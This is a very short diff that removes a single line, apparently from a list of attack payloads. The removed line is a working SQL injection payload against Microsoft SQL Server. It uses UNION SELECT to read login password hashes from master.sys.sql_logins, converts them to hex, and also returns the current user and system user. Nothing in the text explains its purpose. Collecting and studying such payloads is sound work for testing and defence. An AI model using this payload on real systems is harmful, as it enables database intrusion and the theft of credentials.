@@ -1,1 +1,0 @@
-' UNION SELECT 1,2,3,4,5,(SELECT master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins where name like '%Ev%'),user,system_user,user_name()--
